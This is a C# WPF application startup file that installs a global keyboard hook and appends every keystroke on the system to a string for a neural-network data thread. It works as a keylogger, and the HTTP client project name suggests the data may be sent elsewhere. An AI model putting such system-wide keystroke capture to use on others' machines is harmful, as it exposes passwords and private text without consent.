using Gma.System.MouseKeyHook;
using KeyEventArgs =  System.Windows.Forms.KeyEventArgs;
using NNMethods;
using NNDataFunctions;
using System.Windows;
using System.Threading;

namespace HTTP_WPF_Client_Project
{
    /// <summary>
    /// Логика взаимодействия для App.xaml
    /// </summary>
    public partial class App : Application
    {
        public static IKeyboardMouseEvents _globalHook;
        private void Application_StartUp(object sender, StartupEventArgs e)
        {
            NN.StartNNTraining();

            if (_globalHook == null)
            {
                _globalHook = Hook.GlobalEvents();
                _globalHook.KeyDown += GlobalHookKeyPress;
            }
            Thread nnThread = new Thread(new ThreadStart(NNDataGettingControl.Start));
            nnThread.Start();
        }
        private static void GlobalHookKeyPress(object sender, KeyEventArgs e)
        
        {
            NNDataReceiving.keys += e.KeyData.ToString();
        }
    }
}

